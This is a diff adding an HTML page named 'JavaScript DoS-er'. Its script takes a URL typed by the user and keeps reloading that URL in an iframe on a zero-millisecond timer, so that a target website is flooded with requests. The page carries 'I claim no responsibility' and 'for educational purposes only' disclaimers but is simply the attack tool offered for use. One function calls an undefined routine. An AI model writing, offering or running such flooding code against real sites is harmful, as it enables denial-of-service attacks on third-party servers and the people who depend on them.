@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+	<head>
+		<meta charset="UTF-8">
+		<title></title>
+		<link rel="stylesheet" type="text/css" href="css/global.css">
+	</head>
+	<body>
+		<a href="index.htm">Home</a>
+		<p>JavaScript DoS-er.<p>
+		<p><b>I CLAIM NO RESPONSIBILITY!!</b></p>
+		<p><b>FOR EDUCATIONAL PURPOSES ONLY!!</b></p>
+		<p>How it works: It sends as many iframe requests as the client can.</p>
+		<p>URL: <input type="text" id="myURL" value="https://example.org"></p>
+		<button onClick="getButtonContents();myTimer();interval();">DoS</button>
+		<div id="demo"></div>
+		<script>
+			var ui = "https://example.org";
+			
+			function getButtonContents() {
+				ui = document.getElementById("myURL").value;
+			}
+			
+			function myTimer() {
+				document.getElementById("demo").innerHTML = '<iframe src="'+ui+'" style="border:none;"></iframe>';
+			}
+			
+			function interval() {
+				var timer = setInterval(myTimer, 0);
+			}
+			
+			function buttonTimeout() {
+				setTimeout('timeout_trigger()', 0);
+			}
+		</script>
+	</body>
+</html>
